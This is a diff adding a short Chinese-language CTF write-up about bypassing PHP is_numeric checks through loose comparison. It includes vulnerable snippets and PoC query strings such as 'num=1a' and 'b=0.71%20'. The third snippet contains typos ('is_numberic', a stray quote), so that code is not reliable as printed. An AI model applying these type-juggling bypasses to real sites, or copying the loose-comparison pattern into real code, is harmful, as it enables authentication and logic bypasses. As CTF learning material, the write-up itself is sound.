@@ -1,0 +1,75 @@
+题目地址：
+http://120.24.86.145:8002/get/index1.php
+源码：
+$num=$_GET['num'];
+if(!is_numeric($num))
+{
+echo $num;
+if($num==1)
+echo 'flag{**********}';
+}
+看代码，判断是否是数字，不是的话再继续下一个判断，可是下一个判断num要等于1，这就矛盾了？
+poc：get/index1.php?num=1a  就可以绕过了
+
+还有其他例子：
+<?php
+$num = $_GET['num'];
+if(is_numeric($num))
+{
+	echo "Fuck it!";
+}
+else
+{
+	if($num == 8)
+  {
+		echo "You got it!";
+	}
+	echo $num;
+}
+?>
+bypass方法：
+
+test.php?num=8 在 8 后面加任何除数字之外的字母或者符号即可绕过。
+比如 test.php?num=8a，甚至test.php?num=8%20，加一个空格就可以绕过
+
+360播报：
+<?php
+  $a="0.1";
+  $b=$_GET['b']';
+  if($b!='')
+  {
+		if(is_array ($b))
+    	{
+      	echo "nokey";
+     	 exit;
+    	}
+		else if(!is_numberic($b))
+		{
+			$c = (int)(($a+$b)*10);
+			if ($c == "8" && $b [10] ==false)
+			{
+				echo "flag";
+			}
+			else
+			{
+				echo "nokey";
+				exit ;
+			}
+		}
+		else {echo "nokey";}
+	}
+	else {echo "no ";}
+?>
+poc : xxx/test.php?b=0.71%20
+      xxx/test.php?b=0.71e0.1
+    
+注意一点，0.71e1 这样的话就会被判断为数字。e也是个运算符，代表0.71*10^1。    
+    
+    
+    
+    
+    
+    
+    
+    
+  
